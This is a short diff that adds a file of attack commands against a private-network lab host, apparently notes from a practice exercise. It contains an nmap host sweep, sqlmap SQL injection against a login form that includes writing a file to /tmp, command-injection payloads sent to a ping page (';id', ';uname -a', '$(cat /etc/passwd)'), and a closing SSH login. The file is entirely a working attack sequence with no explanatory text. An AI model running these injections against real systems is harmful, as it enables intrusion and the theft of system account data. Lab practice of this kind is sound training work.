@@ -1,0 +1,14 @@
+sudo nmap -sn 192.168.56.0/24
+
+sqlmap -u "http://192.168.56.106/index.php" \
+--data="uname=admin&psw=test&btnLogin=Login"
+
+sqlmap -u "http://192.168.56.106/index.php" \
+--data="uname=admin&psw=test&btnLogin=Login" \
+--sql-query="SELECT 'TEST123' INTO OUTFILE '/tmp/day22.txt'"
+
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;id"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;uname -a"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=$(cat /etc/passwd)"
+
+ssh john@192.168.56.106
